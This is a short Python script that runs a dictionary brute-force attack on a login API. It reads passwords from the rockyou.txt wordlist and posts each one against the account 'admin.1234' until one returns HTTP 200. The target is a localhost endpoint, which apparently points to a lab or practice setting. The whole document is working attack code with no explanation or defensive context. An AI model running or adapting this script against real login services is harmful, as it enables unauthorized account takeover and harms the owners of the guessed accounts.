import requests

url = "http://localhost:9595/api/auth/login"

with open(r"D:\hashcat-6.2.6\hashcat-6.2.6\rockyou.txt",
            "r", encoding = "utf-8") as f:
    pass_brute = f.readlines()
    
    for passwd in pass_brute:
        data = {
            "username": "admin.1234",
            "password": passwd.strip()
        }
        resp = requests.post(url, json = data)
        if (resp.status_code == 200):
            print("==> Password is " + passwd.strip())
            break